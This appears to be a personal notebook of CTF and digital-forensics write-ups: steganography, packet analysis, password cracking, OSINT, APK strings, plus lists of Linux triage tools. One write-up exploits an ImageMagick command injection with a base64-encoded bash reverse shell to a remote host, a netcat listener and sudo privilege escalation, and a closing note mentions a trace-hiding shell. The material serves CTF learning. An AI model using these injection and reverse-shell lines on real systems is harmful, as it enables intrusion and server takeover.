---
created: 2024-05-13T17:53
updated: 2025-02-07T19:08
---
_most used Digital Forensics Tools:_

![[Pasted image 20240808024206.png]]


#source: [Cyber Champions CTF All Forensics Challenges Writeups from R£v!l Team | by Ahmed Ghanem | Medium](https://0xmr8anem.medium.com/cyber-champions-ctf-writeups-for-all-forensics-challenges-from-r-v-l-team-20e0c19c8b6b)

_— — — — — — — — + — — — — — — — -+ — — — — +  
| Challenge | Category | difficulty  
+ — — — — — — — — + — — — — — — — -+ — — — — +  
|_ Suspect-I _| Network | easy  
|_ Battlefield Secrets _|_ Steganography_| easy  
|_ YouKnowMe_|_ Steganography_| Medium  
|_ Mosaic Reconnaissance_|_ Steganography_& Misc | Medium  
|_ FreeM3_|_ Steganography_& Misc | Hard  
+ — — — — — — — — + — — — — — — — -+ — — — — +_

**_Challenge_**_:_ **Suspect-I**  
**_Category: Network_****_difficulty:_** _Easy_

![](https://miro.medium.com/v2/resize:fit:875/1*7NhKXkBOGbAesh-1UHu4TQ.png)

After we opened the pcap file with Wireshark, we found the pcap consists of 5419 packets and there a many packets sent using telnet protocol which caught our eyes :  
**Telnet Protocol is Not secure as there is no encryption used to ensure the confidentiality**

![](https://miro.medium.com/v2/resize:fit:875/1*FhyR5yeizbJLLXGX-3LEjw.png)

so we start to look at the statistics, There are 566 packets sent using telnet that may contain sensitive data

so we start to look at the TCP stream

![](https://miro.medium.com/v2/resize:fit:875/1*9CV1qzHPZZWE2KdHwklB_Q.png)

after we searched in the streams we found the flag as Non encrypted password at stream number 12

![](https://miro.medium.com/v2/resize:fit:875/1*C1ZVEpDp_IG9fMwK4_LU4Q.png)


```
flag: ZiChamp{T3ln3t_Re@llY_Br0}
```

_+ — — — — — — — — + — — — — — — — -+ — — — — +— — — — — — — — + — — — — — —_


> **_Challenge_**_:_ Battlefield Secrets  
> **_Category:_** _Forensics  
> _**_difficulty:_** _Easy_

we got a Battlefield-Secrets.7z compressed file, After we extracted it using **7z** we found a jpg image with the name Army.jpg

![](https://miro.medium.com/v2/resize:fit:875/1*zFjuP0ESlj8uEzZ0ExkXDQ.png)

				Army.jpg

I always start with Exiftool to check the Meta Data of the image

![](https://miro.medium.com/v2/resize:fit:875/1*Ggb3JthsETbmT9h3zabpEw.png)

I found a Base64 encoded in the field of the Camera Model name, After decoding it we found something like a password

![](https://miro.medium.com/v2/resize:fit:688/1*uRXJJY0krdjVhGv9LAK0ow.png)

	Z!C@mp10n

We Tried to use Binwalk and Foremost tools but we found nothing, so We Thought that we should use the password we found to extract the data in the image so we used the steghide tool with the following command


```
steghide extract -sf Army.jpg
```

After that, we were asked for the password so we gave it the password we found above Z!C@mp10n Yes we found a file called flag.txt

![](https://miro.medium.com/v2/resize:fit:846/1*WtAvIK7fOlmKt1DDWgQaSA.png)

After that, we tried to extract the content of the flag.txt but we found a  
unreadable data is extracted

![](https://miro.medium.com/v2/resize:fit:875/1*D2KXxxBL8NtVrEaQUP8ciA.png)

from the first line, we found a hint that told us that this was a Wave file  
we tried to find the file type with the file command but we found nothing

![](https://miro.medium.com/v2/resize:fit:603/1*mLkurqDhDMqeq8pi66BTmw.png)

so we thought that this was a corrupted wave file that we should repair, so we started to look at the magic bytes of the file with the <mark style="background: #FF5582A6;">hexeditor tool and also we searched for the magic bytes for the Not corrupted wave file</mark>

You can find the magic bytes of the most famous files [here](https://en.wikipedia.org/wiki/List_of_file_signatures)

Searching for wav you can find the following magic bytes

![](https://miro.medium.com/v2/resize:fit:875/1*IcxNIh_gn1hzToYJNLNbUA.png)

after that, we start to compare and correct the magic bytes

![](https://miro.medium.com/v2/resize:fit:875/1*dSDNKVy-JOr1PsrxFxkIxg.png)


This was the final result, <mark style="background: #FF5582A6;">we corrected the first 4 corrupted bytes and renamed the file to a .wav file </mark>and Yes the file works well and gives us sounds which is a Morse code you can read about

![](https://miro.medium.com/v2/resize:fit:875/1*Qeag-5vIyq_W4FXqXe38zA.png)

This was the final result we corrected the corrupted bytes and renamed the file to a .wav file and Yes the file works well and gives us sounds which is a Morse code you can read about

Now we need to decode the Morse code, so I started to search for an online Morse decoder and finally, I found the following great decode [Here](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

![](https://miro.medium.com/v2/resize:fit:875/1*u8wWvXEy9jXSL1EF6nCtKg.png)

After Uploading the file and Play it, we got the Flag


```
flag : ZiChamp{5AVU3L-M0R53-@ND-@LFR3D-V@!1-1NV3NT3D-M3}
```

_+ — — — — — — — — + — — — — — — — -+ — — — — + — — — — — — — — + — — — — — —_

> **_Challenge_**_:_ YouKnowMe  
> **_Category:_** _Steganography  
> _**_difficulty: Medium_**


We got a file called You-Know-Me.zip, After we extracted it we found a Directory called Challange is extracted, Challange directory has 7 files with unreadable names

![](https://miro.medium.com/v2/resize:fit:875/1*RealsdQRDVN7wL5fP9tHvA.png)

I started to check the file type of all the files above

![](https://miro.medium.com/v2/resize:fit:875/1*fS-ezg2L_iXd7bJQkEiWIQ.png)

I found a file with the name “_u8ae2e9e-dee0–45f9-b722–43753a8561bb.jpg” This file is a PDF file, not jpg so I renamed this file to file1.pdf

![](https://miro.medium.com/v2/resize:fit:875/1*1OHuaROA9vbBAo9OcgyLZg.png)

I tried to open the PDF and I was asked for the password, I tried to crack the password with John

At first, we need the password hash to crack so we start with the following john tool (pdf2john) and save output to a file called hash

```
pdf2john file1.pdf > hash
```

After we Extracted the hash we started to crack it using the famous wordlist rockyou.txt with the following command

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](https://miro.medium.com/v2/resize:fit:875/1*jt5wvMtBFW0SO4xo3gj9AA.png)

The Password was cracked successfully

> password: 187rideordie

Now we Opened the PDF file with the Password Above and got the following Base64 encoded text

![](https://miro.medium.com/v2/resize:fit:875/1*HGnwcWnAmid0bmg1JVeOuw.png)

```
U1ZOR1FWRkRUV3BLUTFKdFdWZEthbEZWUlQwPQ==
```

Decoding this 3 times we will get a strange word.

![](https://miro.medium.com/v2/resize:fit:875/1*VVD26iZLMbs00cXzr9-CtQ.png)

At that moment I thought this was a password for something we should get from the rest of the files

```
password: !!@@##$$fabcAA
```

At first, I renamed all of the files from image1.jpg to image6.jpg to be able to distinguish between them

- I started with ExifTool for * images nothing found
- Then I tried binwalk and foremost still nothing found
```
- Then I tried Steghide with the password we found (!!@@##$$fabcAA) on  
```
    the images one by one but also nothing found
- Then I tried to play with the layers of the images using the Stegsolve tool but also nothing found
- Then I started to check the Lsb and Msb of the images one by one nothing worked
- After that I started to open images on the online Stego platform [Here](https://georgeom.net/StegOnline/)

I started to open images one by one on this Stego platform and I looked for the strings in each image

![](https://miro.medium.com/v2/resize:fit:875/1*adAXN1nsAr2HE1YdUKOoSA.png)

	My luck was here the image I started with I named (image1.jpg) had the above things

![](https://miro.medium.com/v2/resize:fit:875/1*STEIGCfqWOWP9IP2dR0CWw.png)

and I found a string with the name flag.txt but something was wrong here.

At this point, it took me about 30 minutes so I thought that there was something wrong with the base64.

Yes I was right  !
I returned to this image and tried to see strings from it and I didn’t find this base64.  
I found it from the online tool so I remembered that the strings tool has option -a which extracts all data from the file



![](https://miro.medium.com/v2/resize:fit:875/1*dF5oG-f7pZwOZOD9RuTBnQ.png)

				syntax from strings help

```
strings -a image1.jpg
```


![](https://miro.medium.com/v2/resize:fit:875/1*lASE1ErXYDDa5yIZlWPKTg.png)

We found the correct base64 string

```
NTI2MTcyMjExYTA3MDEwMDMzOTJiNWU1MGEwMTA1MDYwMDA1MDEwMTgwODAwMGI5ZTJiMzllNTcw  
MjAzCjNjYjAwMDA0OWMwMGE0ODMwMmMxOGViN2Q0ODAwMzAxMDg0NjZjNjE2NzJlNzQ3ODc0MzAw  
MTAwMDMwZgo3OWIwM2QyZGM5NTk2MzY5YWRmYTE5OWNiOWMxODdiNjc4MWQ2YzIwNTEzYzhiMmFh  
MDM3OGQ4NTRkMzYKMGJlYjFmMDAzYTZmYmQ1YzM4Y2M5NzM0OTBjZjBhMDMxMzQ4YzNkYzY1OTE2  
NGEwMzQ2OWU3MWM0ZGE1CjU3MmJmNGE4YjhiNWEzOWRkYWFjNzFjZGQ0YzM1MWY1NGYxNDNiZTUy  
OTFkMDI0YjA0ZDViOTJlNTAwYQpjMjliOWJlNWQ3NjQ3Mzc3YWM4NmFlNmE5YzFkNzc1NjUxMDMw  
NTA0MDAK
```

found hex code:

![[Pasted image 20240725230116.png]]
 So i tryed to identify the first 4 magic bytes:

![[Pasted image 20240725230223.png]]

Or decoding it with the base64 online decoder we found a .rar file

![](https://miro.medium.com/v2/resize:fit:875/1*nSWBqW5ZsM9DB2vKdKeLmQ.png)

exporting it as file.rar

![](https://miro.medium.com/v2/resize:fit:875/1*awnytqnvZOzt9hC-3lxilQ.png)

we found a flag.txt file and There is a password needed.

![](https://miro.medium.com/v2/resize:fit:875/1*Bx_JFJ6v5bYhWiPVZiDPYQ.png)

```
We gave it the password we found above (!!@@##$$fabcAA)
```

![](https://miro.medium.com/v2/resize:fit:875/1*rEITcZ2iEePBrDUo3dSC1g.png)

```
flag: ZiChmp{3@5Y_@5_!T_!5_CH@mP}
```

_+ — — — — — — — — + — — — — — — — -+ — — — — + — — — — — — — — + — — — — — —_

**_Challenge_**_:_ Mosaic Reconnaissance  
**_Category:_** _Forensics  
_**_difficulty:_** _Medium_

At this challenge, we got a file with the name Mosaic+Reconnaissance.zip.  
After extraction, we got a file with the name Junk containing 961 files with strange names

![](https://miro.medium.com/v2/resize:fit:875/1*kAIOaCHMUNA7HSF3xZJRhA.png)

we found the images, so we started to look at them images one by one but we found parts of something that looked like a flag in some images

After we collected these images we couldn’t collect the flag from them so we started to think differently.

At first, we tried to check the differences between the names of these images and we tried to take some of these images to a cyberchef and we got that the names of the images were base64 encoded

![](https://miro.medium.com/v2/resize:fit:875/1*Lrsxw9HbeFpa0-mG8dHshA.png)

From here we concluded that these are small parts of a big image and each image name is base64 encoded and the name after decode represents the part placed in the big image


At first, we need to decode the name of images and rename them with the decoded string

We can do this with bash one line

```
for file in $(ls); do mv "$file" "$(echo $file | base64 -d)"; done
```

![](https://miro.medium.com/v2/resize:fit:875/1*9lDnTkjj7JO-vcywu-vUbA.png)

				There are the images after we renamed them.

Now we need to collect these small images together to make a big one

At this point, I knew the concept so I started to ask Chatgpt for help to save some time in the CTF

Chatgpt gave me the base code after many trials with it, i made my modifications, and the final code I used is

```
from PIL import Image  
  
# Load small images  
images = []  
for i in range(961):  
img_path = f"part_{i}.png"  
img = Image.open(img_path)  
images.append(img)  
  
# Calculate the size of the combined image  
widths, heights = zip(*(img.size for img in images))  
max_width = max(widths)  
max_height = max(heights)  
total_width = max_width * 31  
total_height = max_height * 31  
  
# Create a new image with a white background  
combined_img = Image.new('RGB', (total_width, total_height), (255, 255, 255))  
  
# Paste small images into the combined image  
x_offset = 0  
y_offset = 0  
for img in images:  
combined_img.paste(img, (x_offset, y_offset))  
x_offset += max_width  
if x_offset >= total_width:  
x_offset = 0  
y_offset += max_height  
  
# Save the combined image  
combined_img.save('combined_image.png')
```

![[Pasted image 20240725233423.png]]

Finally, I got the combined_image.png

![](https://miro.medium.com/v2/resize:fit:875/1*DyJ3tVhzgLNuTxADiphsPw.png)

The flag is not here 🥵🥵🥵

Finally, we got the flag

```
flag: ZiChmp{1_Th0g5t_15!5_W!lL_K33P_1T_H!dd3n}
```

**_Challenge_**_:_ FreeM3  
**_Category: s_**_teganography  
_**_difficulty: Hard_**

In this challenge, we got a file with the name FreeM3.zip  
After We extract the files in it, We will find two tar files File1.tar & File2.tar

let’s extract files in these two tar files with the following command

```
tar xf $FileName
```

After we extracted File1.tar we got two jpg images with names 300.jpg and 301.jpg

After we extracted File2.tar we got a new tar with the name 999.tar and after we tried to extract it again we got 998 and so on ….

so we need to extract tar files from 999 to 0 we can do this using a simple bash one line:


```
for i in $(seq 999 -1 0); do tar -xvf "$i.tar"; done
```
![[Pasted image 20240725234448.png]]
	estrae i file 1 ad uno fino ad arrivare a 0 eseguendo ogni volte il comando "-xvf" per ogni file estratto:

When the bash line finished, we got the following

![](https://miro.medium.com/v2/resize:fit:773/1*nrArCk87PziC8bbgnd_gYw.png)

File with name No0o.tar

After we extracted what was in it we got a file with the name Noo.txt

We found that Noo.txt is a zip file

![](https://miro.medium.com/v2/resize:fit:875/1*1rjpE3Atq3zbI36kb6pjOA.png)

After we renamed the file to Noo.zip we tried to open it and we found that the zip file needed a password

We tried to crack it with John but we could not crack it

so the two images 300.jpg & 301.jpg may have the password

we start with traditional steps like ExifTool, binwalk, strings…etc  
but we found nothing and unfortunately, the time of the CTF finished

After the CTF finished I asked the author for a hint and he told me to compare strings of the images

After I returned home I asked Google for a tool to compare the strings of two images and I got a tool on Linux called **diff.**

I saved the content of 300.jpg to file1.txt and 301.jpg to file2.jpg

![](https://miro.medium.com/v2/resize:fit:750/1*kUwKfckcBMolGCcaINDc6Q.png)

then I compared them with diff & it looks like a base64 encoded string

I concatenated them and then decoded them as base64

![](https://miro.medium.com/v2/resize:fit:875/1*rePdTK6aphsgxv1JNW5Mag.png)

Now we have the password.

```
Z!Ch@mp!0Ns3cUr3P@55
```

![](https://miro.medium.com/v2/resize:fit:875/1*V6GMkzrxmdOqY7lZXQZPMQ.png)

we can extract a file with the name NotaFlag.txt

I tried to extract the content and I found the NotaFlag.txt file contains many spaces

![](https://miro.medium.com/v2/resize:fit:875/1*SBL1cxSssyqqZ71vRre8xQ.png)

I know this type of encoding is called (whitespace encoding) this type of encoding uses the tab “\t” to represent 1 in binary and uses the space to represent ‘0’ so I wrote a simple Python script to do this process for us.

```
import sys  
  
input_file = sys.argv[1]  
output_file = "output.txt"  
  
with open(input_file, 'r') as infile:  
with open(output_file, 'w') as outfile:  
for line in file:  
replaced_line = line.replace('\t', '1').replace(' ', '0')  
outfile.write(replaced_line)  
  
print(f"{output_file}")
```

After we ran this code we got a file with the name output.txt.

![](https://miro.medium.com/v2/resize:fit:875/1*uhdl_fI9j-Mrv1l9WTwZAw.png)

```
010110100110100101000011011010000110110101110000011110110101100100110000011101010101111101010100011010000011000101101110011010110101111101011001001100000111010101011111010000110100000000110100010111110100001000110011001100100101010001011111010011010011001101011111001100000110100001001000010111110101100100110000011101010101111101000100001000010100010001111101
```

![](https://miro.medium.com/v2/resize:fit:875/1*1zS_rq5LrQoBT8UMJagwzQ.png)

From binary, we got the flag .

```
flag: ZiChmp{Y0u_Th1nk_Y0u_C@4_B32T_M3_0hH_Y0u_D!D}
```

---


Forensics: [CTF/CTFlearn/Digital Forensics/[EASY] A CAPture of a Flag.md at master · V-11/CTF · GitHub](https://github.com/V-11/CTF/blob/master/CTFlearn/Digital%20Forensics/%5BEASY%5D%20A%20CAPture%20of%20a%20Flag.md)

Triage / Incident Response tools for Linux Triage is a procedure for acquiring relevant information within the Response to a Cyber Incident. 

Classifying the information to be acquired and the order of collection, according to its order of volatility (depending on the time in which it will be accessible) and the speed of collection. 

Here I present some tools for this task:
- CyLR (Live Response Collection) [https://lnkd.in/dVjeJSQX](https://lnkd.in/dVjeJSQX?trk=public_post-text)

- Live Response Collection (Nix_Live_Response) 

- BrimorLabs [https://lnkd.in/dTqk_qhY](https://lnkd.in/dTqk_qhY?trk=public_post-text) 

- Linux Triage [https://lnkd.in/dwqUfPbX](https://lnkd.in/dwqUfPbX?trk=public_post-text) 

- Emperor [https://lnkd.in/dSNdcFHW](https://lnkd.in/dSNdcFHW?trk=public_post-text) 

- IR_Tool [https://lnkd.in/dPcAvQpZ](https://lnkd.in/dPcAvQpZ?trk=public_post-text) There are also tools to clone the memory of Linux machines, such as: 

- LiME (Linux Memory Extractor) [https://lnkd.in/dxjrtcRZ](https://lnkd.in/dxjrtcRZ?trk=public_post-text) 

- DumpItForLinux - MagnetForensics [https://lnkd.in/d6iA3vPr](https://lnkd.in/d6iA3vPr?trk=public_post-text)

- AVML (Acquire Volatile Memory for Linux) [https://lnkd.in/d8GTGn5P](https://lnkd.in/d8GTGn5P?trk=public_post-text) Additionally, several 


scripts can be found on the Internet that also serve to obtain all types of artifacts and not have to execute commands one by one. 

Here are some examples:

- Unix-like Artifacts Collector [https://lnkd.in/dcjPPazW](https://lnkd.in/dcjPPazW?trk=public_post-text) 

- Digital Forensics Script for Linux [https://lnkd.in/dJwD8wri](https://lnkd.in/dJwD8wri?trk=public_post-text) 

- TriageX - Linux Triage Tool [https://lnkd.in/d_XR_fAK](https://lnkd.in/d_XR_fAK?trk=public_post-text)


---


#source: [StegOnline: A New GUI Steganography Tool | by George O | CTF Writeups | Medium](https://medium.com/ctf-writeups/stegonline-a-new-steganography-tool-b4eddb8f8f57)

user: [George O – Medium](https://medium.com/@georgeomnet)

## StegOnline: A New GUI Steganography Tool

_You can try the tool yourself_ [_here_](https://stegonline.georgeom.net/)_, or view the project on_ [_GitHub_](https://github.com/Ge0rg3/StegOnline/blob/master/README.md)_._



Once there, upload your image:

![](https://miro.medium.com/v2/resize:fit:700/1*9cA92TK0cntu5rtXxrya6A.png)

You’ll then be redirected to the image homepage.

![](https://miro.medium.com/v2/resize:fit:700/1*4o2pb66URQ_CEmg2jowN7Q.png)

From here, you are presented with the available options. Some images may also present you with different panels — for example, if a PNG has a custom bitmap, the bitmap explorer/randomizer panel will be displayed.

At the moment, the only other GUI tool for LSB data extraction/bit plane browsing available (that I know of) is Stegsolve, but it’s impossible to contribute to the code, and is now completely unmaintained.

## Current Feature List

- View R/G/B/A planes individually
- XOR the image
- Remove Transparency from the image
- Randomize the colour palette/bitmap (if exists)
- Browse through all RGBA bit planes
- View all strings in the image
- Extract all RGBA values
- View PNG chunk info
- Extract LSB data at any bit pattern
- Embed LSB data at any bit pattern
- Embed a black and white image inside of a bit plane

## Checklist

On the site, you can also find a checklist/cheatsheet for solving image stego challenges ([here](https://stegonline.georgeom.net/checklist)). Although the steps may not always solve challenges, they will almost always help you get started.

## Extracting/Embedding LSB Data

Whilst most LSB tools are confusing and difficult to use, StegOnline’s GUI makes the process easy. Once you’ve uploaded your image and navigated to the Embed/Extract pages, you’ll see a table with various options:

![](https://miro.medium.com/v2/resize:fit:700/1*tWGQchSXXt95WMeFzJBe1Q.png)

Choose any bit pattern, and change any settings shown. When it comes to extracting the data, simply put back in the exact same settings.

If the image is too small for the requested data, a warning will be shown.

## Try it out

If you want to test the site, here are some example challenges that are taken care of by this tool:

- HTB: [Flag in bit plane](https://cdn-images-1.medium.com/max/800/1*iw0zggSsB1i4-1j00Kqqiw.png)
- Pragyan CTF: [Remove Transparency](https://xapax.github.io/blog/assets/pragyanctf/transmission.png)
- Custom: [Extract LSB Data](https://georgeom.net/StegOnline/assets/examples/lsb-stego.jpg) (hidden in RGB planes 0)
- PlaidCTF: [Hidden in colour palette](https://ctfs.github.io/resources/topics/steganography/invisible-text/ctf-example.png) (randomize until each part is visible)

If you want to solve one yourself, try to find the two flags in the below image:

![](https://miro.medium.com/v2/resize:fit:700/1*3ZmuSeCMvmyHtP88DIu2hA.png)

(Download the image [here](https://stegonline.georgeom.net/assets/examples/StegOnline_Demo.png) as Medium compression messes it up).


----

#source: [Ahmed Ghanem]([Arab Regional Cybersecurity CT F 2023 Challenges -OSINT-Mobile-Machines Writeup | by Ahmed Ghanem | Medium](https://0xmr8anem.medium.com/arab-regional-cybersecurity-ctf-2023-challenges-osint-mobile-machines-writeup-40361b678611))

##  Arab Regional Cybersecurity CT F 2023 Challenges -OSINT-Mobile-Machines Writeup

_— — — — — — — — + — — — — — — — -+ — — — — +  
| Challenge ===| Category | Points |  
+ — — — — — — — — + — — — — — — — -+ — — — — +  
|_ [Mission Impossible](https://cybertalents.com/competitions/arab-regional-cybersecurity-ctf-2023/mission-impossible-1) _| Osint | 200 |  
| ِAct | Mobile | 50 |  
|_ [GIF Mak3R](https://cybertalents.com/competitions/arab-regional-cybersecurity-ctf-2023/gif-mak3r) _| Machine | 50 |  
+ — — — — — — — — + — — — — — — — -+ — — — — +_

# let’s start with :

> [**Mission Impossible**](https://cybertalents.com/competitions/arab-regional-cybersecurity-ctf-2023/mission-impossible-1)
> 
> **Points:** 200

Description :

_In June 2013,  
cybercriminals began launching DDoS attacks against government websites.  
Recently, they resurfaced under a new name, Operation Troy.  
The APT group accidentally released a significant and sensitive document about themselves.  
We attempted to search for it online,  
but it seems the website where they uploaded it isn't searchable.  
We require your assistance in locating this document so that we can access the information we need._

— From the description we got that the cyber-criminals name is “Operation Troy” and the have crime in 2013 DDOS attack

now let’s google about

![](https://miro.medium.com/v2/resize:fit:875/1*mx8SKC4az1mV9MgZro8Wng.png)

we will find the following article from [**wikipedia**](https://en.wikipedia.org/wiki/Lazarus_Group)

![](https://miro.medium.com/v2/resize:fit:875/1*oF9EvFUICKWA4bVkj80z_g.png)

now we know that the cyber criminals is “**Lazarus group” and the old name is “Darkseoul”**

from the description there is a documentation accidentally released about APT group (**Lazarus group**)

```
The APT group accidentally released a significant and sensitive document about themselves
```

```
`Mission Impossible`  
If you got the document from the largest collection of malware source code, samples, and papers site on the internet. use it wisely.
```

ok let’s find the largest collection of malware source code on the internet  
after search, i found the following GitHub repository called : [vxunderground](https://github.com/vxunderground)

![](https://miro.medium.com/v2/resize:fit:875/1*YZGV2YZqXKRi4k1-IMedeg.png)

the github repository has collection of malware source code, samples, and papers as in the Description

![](https://miro.medium.com/v2/resize:fit:875/1*qXvJWI-fiTflOBU-7lN-Vg.jpeg)

Yes, I am in the right way

they have a large database of malwares with documentations and source code

![](https://miro.medium.com/v2/resize:fit:875/1*cryKQi3KRe-paBpiHMlH0w.png)

let’s search for things in 2013

![](https://miro.medium.com/v2/resize:fit:875/1*Gya25xpx29ToZDfQy4UrEw.jpeg)

after opening Operation Troy  
we will find the samples with the documentation

![](https://miro.medium.com/v2/resize:fit:875/1*Q1lEvFlYqKd0kalF3WAaMg.png)

Now we need the documentation of [Operation Troy](https://samples.vx-underground.org/root/APTs/2013/2013.03.20%20-%20Operation%20Troy/Paper/Operation%20Troy.pdf)

![](https://miro.medium.com/v2/resize:fit:875/1*Kn_dVNlRJXFFhjXNl1lRQw.jpeg)

The Documentation is 29 pages and contains many information  
After a long search in the documentation I found a section called **analysis containing “**calling card a day after the attacks in the form of a web pop-up message”and there is an email and password

![](https://miro.medium.com/v2/resize:fit:830/1*3GuL9E2dHSEKQOntmTSWJQ.jpeg)

**“**[joseph.r.ulatoski@gmail.com](mailto:joseph.r.ulatoski@gmail.com)::lqaz@WSX3edc$RFV”  
for pastepin.com and www.dropbox.com these credentials did not work for both

so let’s do username enumeration using [**sherlock osint tool**](https://github.com/sherlock-project/sherlock)username: “[joseph.r.ulatoski](mailto:joseph.r.ulatoski@gmail.com)”

```
python3 sherlock.py joseph.r.ulatoski
```

this username “joseph.r.ulatoski” has many social accounts  
let’s check them one by one in our browser

The [first bitcoin forum link](https://bitcoinforum.com/profile/joseph.r.ulatoski) was very attractive due to date of creation

![](https://miro.medium.com/v2/resize:fit:875/1*Q9JrysqeyyPdkYpHZFD33w.png)

then show posts we will found a post contain a [pastbin link](https://pastebin.com/wkxJmxnW)

![](https://miro.medium.com/v2/resize:fit:875/1*7VzRQ8UZycp8JVSA55ibSw.png)

I found that Pastebin needs a password so I tried the password found with the email “lqaz@WSX3edc$RFV” but not work so

I remembered that I found the encryption password in the documentation on page 28 “dkwero38oerA^t@#”

![](https://miro.medium.com/v2/resize:fit:875/1*2DSeXH9cNdFryDn4au1-Lg.png)

The password didn’t work

![](https://miro.medium.com/v2/resize:fit:600/1*olrB74bwno1IWyIBlBguMQ.gif)

so I returned back to the PDF searching for the password

  
![](https://miro.medium.com/v2/resize:fit:875/1*pkHRjOCLTUQWkWaYffMDHw.png)

and found that the password needs “.” at the end so  
The correct password is “dkwero38oerA^t@#.”

![](https://miro.medium.com/v2/resize:fit:875/1*8F_YVc68Pdwb7PfRhgenxg.png)

![](https://miro.medium.com/v2/resize:fit:600/1*lYRlEOkAWA2IYNa7HzA24A.gif)

After Hard work got the Flag :

```
Flag{FR13ND5_R41lY1NG_3VERY0N3_EMBR4C1N9_P34CE_4DV0C473_L0U61Y_3XPRE551N9_S01iDAR17Y
```

# The second Challenge :

> **Act**
> 
> **mobile : 50 points**

Description :

![](https://miro.medium.com/v2/resize:fit:875/1*uhpbYF2KfjYTvZ9_cPLT0Q.jpeg)

i can’t remember is it java or javascript

I started with static analysis to the ‘act.apk’ file with strings

```
strings act.apk
```

I found that there are names of files with extensions .xml & .png

![](https://miro.medium.com/v2/resize:fit:454/1*G_OVh7LwqaNqYYpVKHWGIg.png)

so I tried to extract these files using binwalk & foremost tools

```
binwalk -e act.apk
```

![](https://miro.medium.com/v2/resize:fit:875/1*wuy4oDb1U6tw88wnUP-T8Q.png)

now we need to know [apk file Structure](https://www.appdome.com/how-to/devsecops-automation-mobile-cicd/appdome-basics/structure-of-an-android-app-binary-apk/)

![](https://miro.medium.com/v2/resize:fit:875/1*V9piao2fA_nUeZsJUmqqWQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*8dL5ewzhKXACoGmSVOnaIQ.png)

From the description, I saw that he asked for javascript code  
so let’s look at assets

![](https://miro.medium.com/v2/resize:fit:875/1*aw4Pxic4Cu5yhFKJjkDmBw.png)

index.android.bundle is **the JavaScript bundle file  
**lets use strings for common words to get the flag

```
strings * | grep -i flag
```

![](https://miro.medium.com/v2/resize:fit:875/1*QfJ4Qf8U5fjRaA126iG_Gw.png)

yes that is the javascript code,  
I found in “index.android.bundle” file contains interesting flags  
so let’s copy js code and open it in [Online JavaScript beautifier](https://beautifier.io/)

![](https://miro.medium.com/v2/resize:fit:875/1*a2OB_cJ5RBNsGrU8H4PFwA.png)

I found the following :

```
‘flag{N0t_Th4t_E4sy}’)(“616b66607c37333662363f3036613f3765643f3f663366306161643335613632653e653f667a”)
```

I tried “flag{N0t_Th4t_E4sy}” as a flag but it was wrong  
so let’s use the cyberchef with the hex near the flag

“616b66607c37333662363f3036613f3765643f3f663366306161643335613632653e653f667a” + magic + intensive mode

![](https://miro.medium.com/v2/resize:fit:875/1*sFIIkX_DjFkaR6Feu4fUrQ.png)

![](https://miro.medium.com/v2/resize:fit:306/1*9bWNUoBIghlblQgP4awscw.gif)

finally got the flag “flag{041e1871f80bc88a4a7ffc42f15b9b8a}”

****************************************************************************

## The Third Challange

> [**GIF Mak3R**](https://cybertalents.com/competitions/arab-regional-cybersecurity-ctf-2023/gif-mak3r)
> 
> **machine : 50 points**

**The challenge was about** [**CVE-2023–34153**](https://github.com/ImageMagick/ImageMagick/issues/6338)

The vulnerability is at **ImageMagick version 7.1.0–1**

at option “pixel-formate” when we upload a file to convert

the following command runs on the back-end server

```
➜ magick convert -define video:pixel-format='rgba"`cat test.txt > /tmp/leak3.txt`"' smile.gif smile.mov
```

that converts the uploaded gif file to .mov file

![](https://miro.medium.com/v2/resize:fit:875/1*cEhxlRnXL54HadxCA7VaNA.png)

so we can add our reverse shell code in the following format :


```
rgba"`cat test.txt > /tmp/leak3.txt`
```

from the errors in the website during testing I found “/tmp/file” so I thought it was Linux server

i made the following bash reverse shell

```bash
 bash -i >& /dev/tcp/255.255.255.255/5555 0>&1
```

but i used base64 encoding to avoid errors

```bash 
rgba"`echo ImJhc2ggLWkgPiYgL2Rldi90Y3AvMTY1LjIzMi4xODAuNzkvNTU1NSAwPiYxIg== | base64 -d | bash`"
```

![](https://miro.medium.com/v2/resize:fit:875/1*FxuC29LKgpej6-DMKJ_3vw.jpeg)

then i made a listener on my vps

```
nc -nlvp <port>
```

Then run convert in the website —> i got reverse shell on my vps

then we need to privilege escalation  
it was so easy “sudo -l ”

Found **neofetch** any user can run as root with sudo  
using gitfobins [https://gtfobins.github.io/gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/)

![](https://miro.medium.com/v2/resize:fit:875/1*eQuPTNoCv1mj2bgTa2yX3w.png)

using the above commands got the root shell  
And the flag found at “/root/flag.txt”


---

other challenges:   https://itsahmedatef.medium.com/arab-regional-cybersecurity-ctf-2023-web-challenges-and-one-reverse-writeup-3e14528ac0a9?source=post_page-----40361b678611--------------------------------


https://0x4de1.medium.com/arab-regional-cybersecurity-ctf-2023-hard-forensics-challenge-writeup-79345122c54a?source=post_page-----40361b678611--------------------------------




---


https://www.hackingarticles.in/forensic-investigation-pagefile-sys/


Digital Forensics Android: https://www.youtube.com/watch?v=UQYuaOC5v0I

stegonometry https://tierzerosecurity.co.nz/2024/04/03/stego-ldr.html


Forensic Investigation Operations — Windows Base I
https://medium.com/@brsdncr/forensic-investigation-operations-windows-base-i-ca28d9982729


[Steganography : Tools & Techniques | by Ria Banerjee | Medium](https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148)


https://cybersecmaverick.medium.com/htb-cyber-apocalypse-ctf-2024-forensics-16f4c9af5c47?source=read_next_recirc-----20e0c19c8b6b----0---------------------dd4f2882_eafc_4eca_a955_5fedc5668358-------


https://medium.com/@alitoba335/picoctf-2024-forensics-547e9bba6f91?source=read_next_recirc-----20e0c19c8b6b----1---------------------dd4f2882_eafc_4eca_a955_5fedc5668358-------


## Linux Disk Forensics


https://www.youtube.com/watch?v=x88m7G0P_0A


ICMTC Finals Digital Forensics Challenges
https://medium.com/@ELJoOker/icmtc-finals-digital-forensics-challenges-50d358ccf5c7


https://www.youtube.com/watch?v=3T2Al3jdY38

----


#source:  [basic-linux-malware-process-forensics-for-incident-responders](https://sandflysecurity.com/blog/basic-linux-malware-process-forensics-for-incident-responders/)

![[Pasted image 20240825023650.png]]

![[Pasted image 20240825023606.png]]


---


## Hackshell - leave no trace on the target

dosen't show history, runs on memory

to activate it, we need to get it from this url:

![[Pasted image 20250126210521.png]]

Once activated, it will show you a list of commands and then, **a new prompt** and some instructions if you want to put your home directory under **/dev/shm/**

![[Pasted image 20250126210642.png]]
